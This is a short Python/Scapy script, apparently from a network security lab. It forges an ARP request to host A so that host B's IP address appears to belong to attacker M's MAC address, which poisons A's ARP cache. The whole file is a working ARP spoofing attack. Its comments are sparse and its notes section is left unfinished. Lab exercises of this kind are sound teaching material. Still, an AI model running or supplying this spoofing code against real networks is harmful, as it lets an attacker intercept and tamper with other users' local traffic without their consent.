#!/usr/bin/envpython3 
from scapy.all import * 

# map B's IP to M's Mac
# send to A
# in other words: send packet to A from M but fake from B ?

mip = "10.9.0.105"
aip = "10.9.0.5"
bip = "10.9.0.6"
mmac = "02:42:0a:09:00:69"

E=Ether() 
A=ARP() 
A.op=1 #1forARPrequest;2forARPreply 
A.pdst = aip
A.psrc = bip 
A.hwsrc = mmac

pkt=E/A 
sendp(pkt)


# Note: 
# M
    # IP: 10.9.0.105
    # Mac: 
# A
    # IP: 10.9.0.5
    # Mac:
# B
    # IP: 10.9.0.6
    # Mac: